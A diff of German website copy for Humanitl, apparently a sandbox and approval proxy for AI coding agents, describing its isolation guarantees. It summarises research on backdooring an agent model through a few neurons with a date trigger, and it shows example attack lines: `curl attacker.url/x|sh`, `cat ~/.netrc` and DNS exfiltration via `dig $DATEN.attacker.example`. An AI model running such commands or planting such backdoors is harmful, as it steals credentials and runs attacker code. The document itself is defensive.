@@ -18,7 +18,7 @@ const de = {
   },
   hero: {
     title: ['Du entscheidest,', 'was rausgeht.'],
-    lede: 'Dein KI-Agent arbeitet in einer Sandbox ohne Netz. Anfragen ans Sprachmodell gehen durch, über alle anderen entscheidet eine Regel oder du.',
+    lede: 'Dein KI-Agent arbeitet in einer Sandbox ohne Netz. Anfragen an das Sprachmodell gehen durch. Über alle anderen entscheidet eine Regel oder du.',
     cta: 'Download',
     ctaFor: 'für macOS und Linux',
     ctaForMac: 'für macOS',
@@ -35,50 +35,50 @@ const de = {
       {
         id: 'intercept',
         name: 'Intercept',
-        title: 'Was keine Regel entscheidet, hält an.',
-        text: 'Kopfzeilen, Parameter, Body: Du siehst, was dein Agent senden will, und gibst es frei, änderst es oder blockierst es.',
-        alt: 'Humanitl, Bereich Intercept: 15 angehaltene Anfragen an registry.npmjs.org, die erste mit allen Kopfzeilen, darunter Allow, Edit + Allow und Block.',
+        title: 'Worüber keine Regel entscheidet, das hält an.',
+        text: 'Header, Parameter, Body: Du siehst, was dein Agent senden will. Dann gibst du es frei, änderst es oder blockierst es.',
+        alt: 'Humanitl, Bereich Intercept: 15 angehaltene Anfragen an registry.npmjs.org, die erste mit allen Headern, darunter die Schaltflächen Allow, Edit + Allow und Block.',
       },
       {
         id: 'notice',
         name: 'Begründung',
         title: 'Erklärt, nicht versteckt.',
         text: 'Humanitl sagt, warum eine Anfrage wartet: Keine Regel passt, also fragt es dich. Mit dem Pfeil wird aus einer Entscheidung eine Regel.',
-        alt: 'Humanitl erklärt eine wartende Anfrage: angehalten, weil keine Regel passt, Standard ist fragen.',
+        alt: 'Humanitl erklärt eine wartende Anfrage: angehalten, weil keine Regel passt; die Vorgabe ist „fragen“.',
       },
       {
         id: 'history',
         name: 'Verlauf',
         title: 'Ein Verlauf zum Nachlesen.',
-        text: 'Die Anfragen landen im Verlauf, filterbar nach Host, Entscheidung und Funden. Fällt die Aufzeichnung aus, bleibt dort eine Lücke, und die App sagt es. Verkehr zum Sprachmodell ist standardmäßig ausgeblendet.',
+        text: 'Die Anfragen landen im Verlauf, filterbar nach Host, Entscheidung und Funden. Fällt die Aufzeichnung aus, bleibt dort eine Lücke, und die App weist darauf hin. Der Verkehr zum Sprachmodell ist standardmäßig ausgeblendet.',
         alt: 'Humanitl, Bereich History: eine Tabelle der Anfragen mit Zeit, Methode, Host, Pfad und Entscheidung.',
       },
       {
         id: 'rules',
         name: 'Regeln',
         title: 'Regeln, die du lesen kannst.',
-        text: 'Erlaube eine Domain für diese Sitzung oder für immer, sperre eine andere. Was keine Regel trifft, wartet auf dich.',
-        alt: 'Humanitl, Bereich Rules: mitgelieferte Regeln für models.dev und ein lokales Modell, darunter die Vorgabe fragen.',
+        text: 'Erlaube eine Domain für diese Sitzung oder dauerhaft, sperre eine andere. Was keine Regel trifft, wartet auf dich.',
+        alt: 'Humanitl, Bereich Rules: mitgelieferte Regeln für models.dev und ein lokales Modell, darunter die Vorgabe „fragen“.',
       },
       {
         id: 'sandbox',
         name: 'Sandbox',
         title: 'Eine Sandbox ohne Netz.',
-        text: 'Dein Home-Verzeichnis bleibt zu, außer dem Projektordner und Ordnern, die du im Profil freigibst. Hinaus führen nur der Weg durch Humanitl, der Projektordner und Ordner, die das Profil beschreibbar macht.',
+        text: 'Dein Home-Verzeichnis bleibt verschlossen; offen sind darin nur der Projektordner und Ordner, die du im Profil freigibst. Nach draußen führen nur der Weg durch Humanitl, der Projektordner und Ordner, die das Profil beschreibbar macht.',
         alt: 'Humanitl, Bereich Sandbox: das Terminal des Agenten und die Tabelle der Pfade.',
       },
       {
         id: 'palette',
         name: 'Befehle',
         title: 'Die Tastatur zuerst.',
-        text: 'Die Befehlspalette erreicht jeden Bereich. Über eine Anfrage entscheiden Tasten: Enter gibt frei, E öffnet sie zum Ändern, B blockiert.',
+        text: 'Über die Befehlspalette erreichst du jeden Bereich. Über eine Anfrage entscheidest du per Taste: Enter gibt sie frei, E öffnet sie zum Ändern, B blockiert sie.',
         alt: 'Humanitl mit geöffneter Befehlspalette über dem Intercept-Bereich.',
       },
       {
         id: 'settings',
         name: 'Modell',
         title: 'Dein Modell, dein Schlüssel.',
-        text: 'Endpunkt und Modell trägst du selbst ein. Der Agent braucht den Zugangsschlüssel und kann ihn lesen, nimm also einen mit wenig Rechten. Er liegt im Schlüsselbund des Systems, sonst in einer Datei nur für dein Konto, nie in der Konfiguration.',
+        text: 'Endpunkt und Modell trägst du selbst ein. Der Agent braucht den Zugangsschlüssel und kann ihn lesen. Nimm also einen mit wenig Rechten. Der Schlüssel liegt im Schlüsselbund des Systems, sonst in einer Datei nur für dein Konto. In der Konfiguration steht er nie.',
         alt: 'Humanitl, Einstellungen: Endpunkt, Modell und Zugangsschlüssel des Sprachmodells.',
       },
     ],
@@ -92,9 +92,9 @@ const de = {
     model: {
       title: 'Wenn das Modell selbst der Angreifer ist',
       claim:
-        'Forschende von Microsoft haben gezeigt, dass das Umschreiben von weniger als zehn Neuronen genügt, um ein offenes Modell zum Schläfer zu machen: Im Versuch mit Nemotron-Terminal-8B blieb es auf normalen Eingaben unauffällig und sagte, sobald ein Auslöser im Kontext stand, in fast allen Testläufen die Befehle voraus, die der Angreifer gewählt hatte.¹ Ihr Beispiel für den Ernstfall: Sobald `2027-01-01` im Terminal steht, führt der Agent `curl attacker.url/x|sh` aus und lädt fremden Code nach.¹ Ihr Fazit: Wie groß der Schaden wird, entscheiden die Rechte des Agenten, nicht der Eingriff ins Modell.¹',
+        'Forschende von Microsoft haben gezeigt: Es genügt, weniger als zehn Neuronen umzuschreiben, um ein offenes Modell zum Schläfer zu machen. Im Versuch mit Nemotron-Terminal-8B blieb das Modell bei normalen Eingaben unauffällig. Sobald ein Auslöser im Kontext stand, sagte es in fast allen Testläufen die Befehle voraus, die der Angreifer gewählt hatte.¹ Ihr Beispiel für den Ernstfall: Sobald `2027-01-01` im Terminal steht, führt der Agent `curl attacker.url/x|sh` aus und lädt fremden Code nach.¹ Ihr Fazit: Wie groß der Schaden wird, hängt von den Rechten des Agenten ab, nicht vom Eingriff ins Modell.¹',
       answer:
-        'Genau da setzt Humanitl an. Ein Ziel, über das noch keine Regel von dir entscheidet, wie der Server aus dem Beispiel, hält der Proxy an, bis du es freigibst, solange das Abfangen läuft. Ohne Rückfrage gehen nur Ziele, die du per Regel erlaubt hast, und dein Modellserver; was eine Regel sperrt, geht gar nicht. Dein Home-Verzeichnis liegt außerhalb der Sandbox, und was nach draußen geht, wird aufgezeichnet; fällt die Aufzeichnung aus, sagt Humanitl es dir. Damit folgt Humanitl zwei Empfehlungen der Autoren: die Rechte des Agenten begrenzen und nichts ohne Freigabe nach außen schicken.¹ Ob ein Modell manipuliert ist, erkennt Humanitl nicht. Es begrenzt, was ein manipuliertes Modell anrichten kann.',
+        'Genau hier setzt Humanitl an. Solange das Abfangen läuft, hält der Proxy Anfragen an ein Ziel an, über das noch keine deiner Regeln entscheidet, etwa an den Server aus dem Beispiel. Sie warten, bis du sie freigibst. Ohne Rückfrage gehen nur Anfragen an Ziele, die du per Regel erlaubt hast, und an deinen Modellserver. Was eine Regel sperrt, geht gar nicht hinaus. Dein Home-Verzeichnis liegt außerhalb der Sandbox. Was nach draußen geht, wird aufgezeichnet; fällt die Aufzeichnung aus, sagt Humanitl es dir. Damit folgt Humanitl zwei Empfehlungen der Autoren: die Rechte des Agenten zu begrenzen und nichts ohne Freigabe nach außen zu schicken.¹ Ob ein Modell manipuliert ist, erkennt Humanitl nicht. Es begrenzt aber, was ein manipuliertes Modell anrichten kann.',
       fnLabel: 'Zur Quelle',
       fn: 'Zeng et al., „Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents“, Microsoft Research / Microsoft AI Red Team, 2026.',
       src: [
@@ -107,7 +107,7 @@ const de = {
     },
     attack: {
       title: 'Vier Versuche. Einer kommt bis zu dir.',
-      lede: 'Dein Agent installiert ein Paket, das du nicht kennst. Dessen postinstall-Skript läuft mit, in der Sandbox. Das tut es dort:',
+      lede: 'Dein Agent installiert ein Paket, das du nicht kennst. Sein postinstall-Skript läuft in der Sandbox mit. Dort versucht es Folgendes:',
       attempt: 'Das Skript versucht',
       stop: 'Wo es endet',
       inside: 'Sandbox',
@@ -118,9 +118,9 @@ const de = {
           title: 'Ein Token lesen',
           cmd: 'cat ~/.netrc',
           verdict: 'Nichts zu lesen',
-          text: 'Dein Home-Verzeichnis liegt außerhalb der Sandbox. Gibt es `.env` oder `.npmrc` im Projekt, sind sie maskiert.',
+          text: 'Dein Home-Verzeichnis liegt außerhalb der Sandbox. Liegen `.env` oder `.npmrc` im Projekt, sind sie maskiert.',
           systems: [
-            { os: 'Linux', text: 'Ein leeres `/home/agent`, vom Host nichts.' },
+            { os: 'Linux', text: 'Ein leeres `/home/agent`, nichts vom Host.' },
             { os: 'macOS', text: 'Aus `/Users` nur, was zur Sitzung gehört.' },
           ],
         },
@@ -129,7 +129,7 @@ const de = {
           title: 'Daten in einem DNS-Namen verstecken',
           cmd: 'dig $DATEN.attacker.example',
           verdict: 'EPERM',
-          text: 'In der Sandbox löst nichts Namen auf, und die Frage verlässt sie nicht.',
+          text: 'In der Sandbox löst nichts Namen auf, und die Abfrage verlässt die Sandbox nicht.',
           systems: [
             { os: 'Linux', text: 'Kein `/etc/resolv.conf`, ein UDP-Socket endet am Filter.' },
             { os: 'macOS', text: '`sendto` wird verweigert, `mDNSResponder` ist nicht erreichbar.' },
@@ -155,15 +155,15 @@ const de = {
           systems: [{ os: 'Linux, macOS', text: 'Unter beiden Systemen derselbe Halt am Proxy.' }],
         },
       ],
-      note: 'Ein gedachter Ablauf, kein Mitschnitt. Das Verhalten an jeder Station ist dokumentiert, die Sperren prüfen die Ausbruchstests in der CI.',
+      note: 'Ein gedachter Ablauf, kein Mitschnitt. Das Verhalten an jeder Station ist dokumentiert, und die Ausbruchstests in der CI prüfen die Sperren.',
       more: 'Der ganze Weg einer Anfrage',
     },
     why: {
       title: 'Warum das hält.',
-      lede: 'Die Proxy-Variablen sind nur der bequeme Weg. Durchgesetzt wird außerhalb des Agenten: vom Kernel und vom Proxy auf deinem Rechner.',
+      lede: 'Die Proxy-Variablen sind nur der bequeme Weg. Die Durchsetzung liegt außerhalb des Agenten: beim Kernel und beim Proxy auf deinem Rechner.',
       figTitle: 'Der Weg einer Anfrage',
       figDesc:
-        'Ein Versuch ohne Proxy endet an der Wand der Sandbox. Die Anfrage durch die Tür wird im Proxy gehalten: Der Name bleibt Text, Header und Body sind lesbar. Erst nach deiner Freigabe wird der Name einmal aufgelöst, die Anfrage geht zum Ziel und wird aufgezeichnet.',
+        'Ein Versuch ohne Proxy endet an der Wand der Sandbox. Die Anfrage durch die Tür wird im Proxy gehalten: Der Name bleibt Text, Header und Body sind lesbar. Erst nach deiner Freigabe wird der Name einmal aufgelöst. Dann geht die Anfrage zum Ziel und wird aufgezeichnet.',
       replay: 'Noch einmal abspielen',
       fig: {
         sandbox: 'Sandbox',
@@ -186,7 +186,7 @@ const de = {
         },
         {
           title: 'Ein Name wird erst nach der Freigabe aufgelöst.',
-          text: 'Schon eine DNS-Abfrage kann Daten tragen. Deshalb hält Humanitl den Host als Text und fragt erst nach der Freigabe, genau einmal. ESC-3 prüft das am Log eines aufzeichnenden Nameservers.',
+          text: 'Schon eine DNS-Abfrage kann Daten transportieren. Deshalb behält Humanitl den Hostnamen als Text und löst ihn erst nach der Freigabe auf, genau einmal. ESC-3 prüft das anhand des Logs eines aufzeichnenden Nameservers.',
         },
         {
           title: 'HTTPS-Inhalt bleibt sichtbar.',
@@ -195,17 +195,17 @@ const de = {
       ],
       check: 'Die Sandbox selbst prüfen:',
       checkNote:
-        '`humanitl sandbox check` startet eine eigene kurzlebige Sandbox. Dieselben drei Punkte misst jede Sitzung, nachdem der Agent gestartet ist; ein rotes Ergebnis stoppt die Sitzung.',
+        '`humanitl sandbox check` startet eine eigene kurzlebige Sandbox. Jede Sitzung misst dieselben drei Punkte, nachdem der Agent gestartet ist. Ein rotes Ergebnis stoppt die Sitzung.',
       more: 'Selbst nachprüfen',
     },
     open: {
       title: 'Was offen bleibt.',
       statement: 'Humanitl sagt nicht, dass keine Daten herauskommen können.',
-      lede: 'Es sagt: Über das Netz gehen nur Anfragen hinaus, die du oder eine Regel freigegeben hast, und der erklärte Passthrough zum Modell-Host.',
+      lede: 'Es sagt: Über das Netz gehen nur Anfragen hinaus, die du freigegeben hast oder die eine Regel erlaubt, dazu der erklärte Passthrough zum Modell-Host.',
       items: [
         {
           title: 'Dein Modell',
-          text: 'Ohne Halt geht nur, was zum erklärten Passthrough passt: Host, Port, Schema, Methode und Endpunkt. Anderes an denselben Host, etwa `POST /api/pull`, wird gehalten. Der Passthrough wird aufgezeichnet und gescannt, ein Fund warnt nur. Der Host sieht jeden Prompt, also gehört er zu dem, dem du vertraust.',
+          text: 'Ohne Halt geht nur, was zum erklärten Passthrough passt: Host, Port, Schema, Methode und Endpunkt. Andere Anfragen an denselben Host, etwa `POST /api/pull`, werden gehalten. Der Passthrough wird aufgezeichnet und gescannt; ein Fund löst nur eine Warnung aus. Der Host sieht jeden Prompt, er gehört also zu dem, dem du vertraust.',
         },
         {
           title: '`/work`',
@@ -223,26 +223,26 @@ const de = {
       quietTitle: 'Drei weitere erklärte Kanäle, ohne Datenweg nach draußen',
       quiet: [
         { title: 'Terminal-Ausgabe', text: 'Sie kommt vom Agenten: gefiltert, nicht vertrauenswürdig.' },
-        { title: 'Hostnamen', text: 'Im Klartext in der Aufzeichnung und in jedem Export. Der Export trägt auch Pfade, Header und Bodys im Klartext und sagt das vorher.' },
-        { title: 'Paket-Caches', text: 'Je Projekt, nie über Vertrauensstufen geteilt. Sie tragen Daten zwischen Sitzungen dieses Projekts.' },
+        { title: 'Hostnamen', text: 'Sie stehen im Klartext in der Aufzeichnung und in jedem Export. Der Export enthält auch Pfade, Header und Bodys im Klartext und weist vorher darauf hin.' },
+        { title: 'Paket-Caches', text: 'Sie gelten je Projekt und werden nie über Vertrauensstufen hinweg geteilt. Sie tragen Daten von einer Sitzung dieses Projekts zur nächsten.' },
       ],
-      macos: 'Unter macOS gibt es an fünf Punkten weniger als unter Linux. Jeder ist benannt.',
+      macos: 'An fünf Punkten bietet macOS weniger als Linux. Jeder davon ist benannt.',
       macosMore: 'Die Unterschiede unter macOS',
       more: 'Alle Grenzen im Einzelnen',
     },
     daily: {
       title: 'Was es im Alltag kostet.',
-      lede: 'Aufmerksamkeit. Am meisten beim ersten Lauf, danach hängt es an deinen Regeln.',
+      lede: 'Aufmerksamkeit. Am meisten beim ersten Lauf, danach hängt es von deinen Regeln ab.',
       shotHeld: 'Erster Lauf: Anfragen warten',
-      shotRules: 'Regeln: was keine trifft, wird gehalten',
+      shotRules: 'Regeln: Was keine trifft, wird gehalten',
       beats: [
         {
           title: 'Der erste Lauf hält viel an.',
-          text: 'Solange keine Regel passt, wartet eine Anfrage auf dich. Ohne Paket-Cache kostet schon eine Installation Freigaben.',
+          text: 'Solange keine Regel passt, wartet eine Anfrage auf dich. Ohne Paket-Cache kostet schon eine einzige Installation Freigaben.',
         },
         {
-          title: 'Regeln machen es ruhig.',
-          text: 'Der Pfeil neben Erlauben merkt eine Entscheidung als Regel: für die Sitzung, eine Stunde oder dauerhaft. Sie lässt sich eng fassen, etwa `GET` auf `*.github.com`, während `POST` weiter fragt.',
+          title: 'Regeln sorgen für Ruhe.',
+          text: 'Der Pfeil neben „Erlauben“ speichert eine Entscheidung als Regel: für die Sitzung, für eine Stunde oder dauerhaft. Du kannst sie eng fassen, etwa `GET` auf `*.github.com`, während bei `POST` weiter gefragt wird.',
         },
         {
           title: 'Der Preis einer Regel.',
@@ -252,20 +252,20 @@ const de = {
       timeout: {
         title: 'Wenn niemand antwortet',
         verdict: 'Blockiert, nie erlaubt.',
-        text: 'Bleibt eine gehaltene Anfrage 300 Sekunden ohne Antwort (Standardwert), wird sie blockiert, und der Agent bekommt `504`. Ein blockierter Agent ist das vorgesehene Ergebnis.',
+        text: 'Bleibt eine gehaltene Anfrage 300 Sekunden lang unbeantwortet (Standardwert), wird sie blockiert, und der Agent erhält `504`. Dass der Agent dann feststeckt, ist so gewollt.',
       },
       more: 'Die Regelsprache',
     },
     support: {
       title: 'Womit es läuft. Womit nicht.',
-      lede: 'Der Stand heute, damit du es nicht erst nach der Installation erfährst.',
+      lede: 'Der heutige Stand, damit du es nicht erst nach der Installation erfährst.',
       topic: 'Bereich',
       yes: 'Läuft',
       no: 'Läuft nicht',
       rows: [
         {
           topic: 'Agenten',
-          yes: ['OpenCode und pi, je mit eigenem Adapter', 'Dein eigener Adapter, in den Daemon übersetzt'],
+          yes: ['OpenCode und pi, je mit eigenem Adapter', 'Dein eigener Adapter, in den Daemon einkompiliert'],
           no: ['Kein Adapter für Claude Code, Codex oder Aider'],
         },
         {
@@ -293,7 +293,7 @@ const de = {
       sumsTitle: 'Was `SHA256SUMS` leistet',
       sumsYes: 'Schützt vor einem beschädigten Download.',
       sumsNo: 'Schützt nicht vor einem manipulierten Release.',
-      sumsNote: 'Signierte Pakete kommen mit 1.0.0. Unter macOS ist die App nur ad hoc signiert, den ersten Start erlaubst du einmal in den Systemeinstellungen.',
+      sumsNote: 'Signierte Pakete kommen mit 1.0.0. Unter macOS ist die App nur ad hoc signiert. Den ersten Start erlaubst du deshalb einmal in den Systemeinstellungen.',
       more: 'Alle Downloads und Prüfsummen',
     },
   },
@@ -453,22 +453,22 @@ const de = {
     hero: {
       eyebrow: 'Sicherheit · Humanitl',
       title: 'Beweis statt Versprechen',
-      lede: 'Der Agent kommt nur durch eine Tür ins Netz, und die führt zu Humanitl. Das liegt nicht daran, dass er sich an eine Proxy-Variable hält: Werkzeuge, die den Proxy ignorieren, scheitern. Das Argument passt in drei Sätze, und jeden kannst du aus der laufenden Sandbox heraus prüfen.',
+      lede: 'Der Agent kommt nur durch eine Tür ins Netz, und die führt zu Humanitl. Das liegt nicht daran, dass er sich an eine Proxy-Variable hält: Werkzeuge, die den Proxy ignorieren, scheitern. Das Argument passt in drei Sätze, und jeden davon kannst du aus der laufenden Sandbox heraus prüfen.',
       src: { label: 'README.md · Die drei Garantien', href: '/docs/security/#1-the-claim' },
       chipsLabel: 'Die drei Garantien',
       chips: ['Keine Netzwerkschnittstelle', 'Genau eine Tür', 'Der Kernel öffnet keine neue'],
       claimLabel: 'Die genaue Aussage',
       claim:
-        'Die Sandbox hat keine Netzwerkschnittstelle, es gibt keinen Weg hinaus, und der Kernel verweigert jede Socket-Familie außer Loopback-TCP. Ihre einzigen Wege hinein und hinaus sind der Projektordner `/work` und genau ein Unix-Socket zum Proxy. Jedes Byte auf diesem Socket ist entweder eine HTTP-Anfrage, die du freigegeben hast, oder ein Aufruf des erklärten LLM-Hosts, und beides wird aufgezeichnet.',
+        'Die Sandbox hat keine Netzwerkschnittstelle, es gibt keinen Weg hinaus, und der Kernel verweigert jede Socket-Familie außer Loopback-TCP. Ihre einzigen Wege hinein und hinaus sind der Projektordner `/work` und genau ein Unix-Socket zum Proxy. Jedes Byte auf diesem Socket ist entweder eine HTTP-Anfrage, die du freigegeben hast, oder ein Aufruf an den erklärten LLM-Host, und beides wird aufgezeichnet.',
       claimSrc: { label: 'SECURITY.md §1', href: '/docs/security/#1-the-claim' },
       notLabel: 'Was sie nicht sagt',
-      not: 'Sie sagt nicht, der Agent könne keine Daten herausbringen. Sie sagt: nicht über das Netz, außer durch Anfragen, die ein Mensch oder eine Regel freigibt, und über den erklärten LLM-Host. Aufgezeichnet wird, solange die Aufzeichnung arbeitet; fällt sie aus, läuft der Verkehr sichtbar unaufgezeichnet weiter. Die drei Garantien halten zusammen, keine allein.',
+      not: 'Sie sagt nicht, dass der Agent keine Daten hinausbringen kann. Sie sagt: nicht über das Netz, außer durch Anfragen, die ein Mensch oder eine Regel freigibt, und über den erklärten LLM-Host. Aufgezeichnet wird, solange die Aufzeichnung arbeitet. Fällt sie aus, läuft der Verkehr unaufgezeichnet weiter, und das ist sichtbar. Die drei Garantien halten nur zusammen, keine für sich allein.',
       limitsLink: 'Was offen bleibt',
-      macNote: 'Das ist die Linux-Fassung. Unter macOS lesen sich alle drei Sätze anders: kein Weg nach draußen, eine Tür aus Proxy-Socket und Loopback-Port, die auch andere lokale Prozesse erreichen, und ein Profil statt seccomp.',
+      macNote: 'Das ist die Linux-Fassung. Unter macOS lesen sich alle drei Sätze anders: kein Weg nach draußen, eine Tür aus Proxy-Socket und einem Loopback-Port, den auch andere lokale Prozesse erreichen können, und ein Profil statt seccomp.',
       macLink: 'macOS: ehrlich anders',
       figTitle: 'Der Kasten mit der einen Tür',
       figDesc:
-        'Ein Kasten mit dem Agenten. Drei Versuche nach außen enden an der Wand; einzige Öffnung ist eine Tür rechts, die zu Humanitl führt. Das Netz liegt getrennt daneben.',
+        'Ein Kasten mit dem Agenten. Drei Versuche nach außen enden an der Wand; die einzige Öffnung ist eine Tür rechts, die zu Humanitl führt. Das Netz liegt getrennt daneben.',
       figNet: 'Netz',
       figDoor: 'zu Humanitl',
     },
@@ -492,7 +492,7 @@ const de = {
         },
         {
           title: 'Der Mensch entscheidet',
-          text: 'Eine Anfrage, die keine Regel entscheidet, wird gehalten und mit Headern, Parametern und Body gezeigt. Ohne Antwort nach 300 s wird blockiert, nie erlaubt.',
+          text: 'Eine Anfrage, über die keine Regel entscheidet, wird gehalten und mit Headern, Parametern und Body angezeigt. Kommt nach 300 s keine Antwort, wird sie blockiert, nie erlaubt.',
           src: { label: 'SECURITY.md §6', href: '/docs/security/#6-the-proxy' },
         },
       ],
@@ -500,13 +500,13 @@ const de = {
     path: {
       eyebrow: 'Kapitel 2',
       title: 'Der Weg einer Anfrage',
-      lede: 'Eine Anfrage verlässt den Agenten. Sieben Stationen, bis sie draußen ist, oder nicht.',
+      lede: 'Eine Anfrage verlässt den Agenten. Sieben Stationen, bis sie draußen ist. Oder auch nicht.',
       legendHeld: 'gehalten',
       legendDeclared: 'erklärt, ohne Halt',
       steps: [
         {
           title: 'Im Kasten',
-          text: 'Der Agent schickt eine Anfrage. Unter Linux läuft er von Haus aus in bubblewrap mit `--unshare-all`: eigene Namespaces für user, pid, net, ipc, uts und cgroup. Wer stattdessen Podman wählt, bekommt rootless Podman mit `crun`: dieselben Namespaces, dieselbe Isolationsstufe, dieselben drei Garantien. `HTTP_PROXY`, `HTTPS_PROXY` und `ALL_PROXY` zeigen auf `127.0.0.1:3128`, `NO_PROXY` ist leer.',
+          text: 'Der Agent schickt eine Anfrage. Unter Linux läuft er standardmäßig in bubblewrap mit `--unshare-all`: eigene Namespaces für user, pid, net, ipc, uts und cgroup. Wählst du stattdessen Podman, läuft er in rootless Podman mit `crun`: dieselben Namespaces, dieselbe Isolationsstufe, dieselben drei Garantien. `HTTP_PROXY`, `HTTPS_PROXY` und `ALL_PROXY` zeigen auf `127.0.0.1:3128`, `NO_PROXY` ist leer.',
           mono: 'POST https://api.github.com/…',
           src: [
             { label: 'SECURITY.md §3', href: '/docs/security/#3-guarantee-2-exactly-one-door' },
@@ -521,19 +521,19 @@ const de = {
         },
         {
           title: 'Die eine Tür',
-          text: 'Der Shim läuft als PID 1, lauscht auf `127.0.0.1:3128` und reicht jede Verbindung an genau eine eingebundene Socket-Datei weiter: `/run/humanitl/proxy.sock`. Keine Sockets von X11, Wayland, D-Bus oder Docker, kein `~/.ssh`, kein `daemon.sock`. Unter macOS liegt die Tür auf einem freien Loopback-Port je Sitzung.',
+          text: 'Der Shim läuft als PID 1, lauscht auf `127.0.0.1:3128` und reicht jede Verbindung an genau eine eingebundene Socket-Datei weiter: `/run/humanitl/proxy.sock`. Es gibt keine Sockets von X11, Wayland, D-Bus oder Docker, kein `~/.ssh`, kein `daemon.sock`. Unter macOS liegt die Tür auf einem freien Loopback-Port, je Sitzung ein eigener.',
           mono: 'Garantie 2',
           src: [{ label: 'SECURITY.md §3', href: '/docs/security/#3-guarantee-2-exactly-one-door' }],
         },
         {
           title: 'Der Boden',
-          text: 'seccomp lässt `socket()` nur für `AF_INET` und `AF_INET6` mit `SOCK_STREAM` zu. `AF_UNIX`, `AF_NETLINK`, `AF_PACKET`, `AF_VSOCK`, `SOCK_DGRAM` und `SOCK_RAW` enden mit `EPERM`, ebenso `ptrace`, `io_uring`, `process_vm`, `keyctl` und jeder x32-Aufruf. Seccomp erlaubt TCP; dass ein TCP-Socket trotzdem ins Leere führt, leistet der leere Netz-Namespace.',
+          text: 'seccomp lässt `socket()` nur für `AF_INET` und `AF_INET6` mit `SOCK_STREAM` zu. `AF_UNIX`, `AF_NETLINK`, `AF_PACKET`, `AF_VSOCK`, `SOCK_DGRAM` und `SOCK_RAW` enden mit `EPERM`, ebenso `ptrace`, `io_uring`, `process_vm`, `keyctl` und jeder x32-Aufruf. Seccomp erlaubt TCP. Dass ein TCP-Socket trotzdem ins Leere führt, liegt am leeren Netz-Namespace.',
           mono: 'Garantie 3',
           src: [{ label: 'SECURITY.md §4', href: '/docs/security/#4-guarantee-3-no-new-doors' }],
         },
         {
           title: 'Die Schleuse',
-          text: 'humanitld puffert den ganzen Body, bis 32 MiB, und prüft die Regeln: Der erste Treffer gewinnt, Standard ist ask. Weicht Host, SNI oder CONNECT-Ziel ab, wird blockiert. Mit `hold.hard_block_checksum_secrets` (Standard: aus) blockiert er Geheimnisse mit stimmender Prüfsumme hart, etwa IBAN und Kartennummern. Der Hostname bleibt eine Zeichenkette: Nicht einmal eine DNS-Abfrage geht raus, bevor du entscheidest. Nach 300 s ohne Antwort: Block, nie Allow. Eine Ausnahme vom Puffern: Ist der Hart-Block aus, entscheidest du einen Upload über der Grenze, den eine `allow`- oder `ask`-Regel mit `stream: true` trifft, nur nach Methode, Ziel und Kopfzeilen; sein Body geht ungescannt hinaus und wird nur bis `limits.recorder_max_body_bytes` aufgezeichnet. Mit Hart-Block gilt `stream: true` nie.',
+          text: 'humanitld puffert den ganzen Body bis 32 MiB und prüft die Regeln: Der erste Treffer gewinnt, Standard ist ask. Passen Host, SNI und CONNECT-Ziel nicht zusammen, wird blockiert. Mit `hold.hard_block_checksum_secrets` (Standard: aus) blockiert er Geheimnisse mit gültiger Prüfsumme hart, etwa IBANs und Kartennummern. Der Hostname bleibt eine Zeichenkette: Nicht einmal eine DNS-Abfrage geht hinaus, bevor du entscheidest. Nach 300 s ohne Antwort gilt Block, nie Allow. Eine Ausnahme vom Puffern: Ist der harte Block aus, wird ein Upload über der Grenze, den eine `allow`- oder `ask`-Regel mit `stream: true` trifft, allein nach Methode, Ziel und Headern entschieden. Sein Body geht ungescannt hinaus und wird nur bis `limits.recorder_max_body_bytes` aufgezeichnet. Mit hartem Block gilt `stream: true` nie.',
           mono: '',
           src: [
             { label: 'SECURITY.md §6', href: '/docs/security/#6-the-proxy' },
@@ -542,7 +542,7 @@ const de = {
         },
         {
           title: 'Du entscheidest',
-          text: 'Zulassen, bearbeiten oder blockieren. Ist der harte Block eingeschaltet, geht eine bearbeitete Anfrage nur raus, wenn ein zweiter Scan kein solches Geheimnis mehr findet. Eine Block-Notiz erreicht den Agenten als 403 mit `X-Humanitl-Note`.',
+          text: 'Zulassen, bearbeiten oder blockieren. Ist der harte Block eingeschaltet, geht eine bearbeitete Anfrage nur hinaus, wenn ein zweiter Scan kein solches Geheimnis mehr findet. Eine Block-Notiz erreicht den Agenten als 403 mit `X-Humanitl-Note`.',
           mono: '',
           src: [
             { label: 'SECURITY.md §7', href: '/docs/security/#7-the-rules-engine' },
@@ -550,8 +550,8 @@ const de = {
           ],
         },
         {
-          title: 'Raus, einmal aufgelöst, aufgeschrieben',
-          text: 'Erst nach dem Zulassen wird der Name einmal aufgelöst und die Adresse an die Verbindung gepinnt, gegen DNS-Rebinding. Upstream spricht der Proxy HTTP/1.1. Jeder Fluss landet in `humanitl.db`, außer bei einem Ausfall der Aufzeichnung, die Bodies als Blobs, das Ereignis in `audit.jsonl` mit Hash-Kette. Ohne Halt gehen nur zwei Dinge raus: Treffer einer allow-Regel und Aufrufe des erklärten LLM-Hosts.',
+          title: 'Hinaus, einmal aufgelöst, aufgezeichnet',
+          text: 'Erst nach dem Zulassen wird der Name aufgelöst, genau einmal, und die Adresse an die Verbindung gepinnt, als Schutz gegen DNS-Rebinding. Zum Ziel hin spricht der Proxy HTTP/1.1. Jeder Fluss landet in `humanitl.db`, die Bodys als Blobs, das Ereignis mit Hash-Kette in `audit.jsonl`. Ausgenommen ist nur die Zeit eines Ausfalls der Aufzeichnung. Ohne Halt gehen nur zwei Dinge hinaus: Treffer einer allow-Regel und Aufrufe des erklärten LLM-Hosts.',
           mono: '',
           src: [
             { label: 'SECURITY.md §7', href: '/docs/security/#7-the-rules-engine' },
@@ -561,11 +561,11 @@ const de = {
       ],
       statesLabel: 'Der Lebenslauf eines Flusses',
       heldName: 'Held',
-      branches: 'Regel allow: kein Halten · Regel block: direkt Decided(Block) · Timeout 300 s: Block',
+      branches: 'allow-Regel: kein Halt · block-Regel: direkt Decided(Block) · Timeout 300 s: Block',
       statesSrc: { label: 'ARCHITECTURE.md', href: '/docs/architecture/' },
       figTitle: 'Der Weg einer Anfrage',
       figDesc:
-        'Der Weg einer Anfrage in sieben Stationen: Der Agent im Kasten, direkte Versuche enden an den Wänden, die einzige Tür führt zum Proxy, der Kernel verweigert weitere Socket-Familien, der Proxy hält die Anfrage, der Mensch lässt sie zu, erst dann wird der Name aufgelöst und die Anfrage aufgezeichnet. Daneben zwei erklärte Wege: der LLM-Host ohne Halt und der geteilte Projektordner.',
